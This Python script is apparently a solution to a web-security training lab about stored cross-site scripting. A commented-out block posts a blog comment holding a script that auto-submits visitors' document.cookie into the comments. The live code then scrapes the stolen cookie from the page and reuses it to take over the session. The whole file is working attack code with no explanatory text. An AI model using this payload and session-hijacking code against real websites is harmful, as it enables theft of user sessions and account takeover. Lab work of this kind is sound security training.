import requests, re
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac821fe41e588e6fc0a6226400ec0023.web-security-academy.net'

# def try_post(name, comment):
#     blog_post_url = f'https://{site}/post?postId=1'
#     resp = s.get(blog_post_url)
#     soup = BeautifulSoup(resp.text,'html.parser')
#     csrf = soup.find('input', {'name':'csrf'}).get('value')

#     comment_url = f'https://{site}/post/comment'
#     comment_data = {
#         'csrf' : csrf,
#         'postId' : '1',
#         'comment' : comment,
#         'name' : name,
#         'email' : 'elafleur@pdx.edu',
#         'website': 'https://pdx.edu'
#     }

#     resp = s.post(comment_url, data=comment_data)
#     print(resp)


# comment_xss = '''<script> 
#     python3 document.addEventListener("DOMContentLoaded", function() {
#     document.forms[0].name.value = 'elafleur';
#     document.forms[0].email.value = 'elafleur@frontier.com';
#     document.forms[0].postId.value = 1;
#     document.forms[0].csrf.value = document.getElementsByName('csrf')[0].value;
#     document.forms[0].comment.value = document.cookie;
#     document.forms[0].website.value = 'https://pdx.edu';
#     document.forms[0].submit();
# });
# </script>'''

# try_post("Exploit", comment_xss)

blog_post_url = f'https://{site}/post?postId=1'

resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
cookie_list = soup.find('p', text=re.compile('secret')).text.split(';')
print(cookie_list)

cookie_dict = dict()
for cookie in cookie_list:
    c = cookie.split('=')
    cookie_dict[c[0]] = c[1]
print(cookie_dict)
resp = s.get(f'https://{site}',cookies=cookie_dict)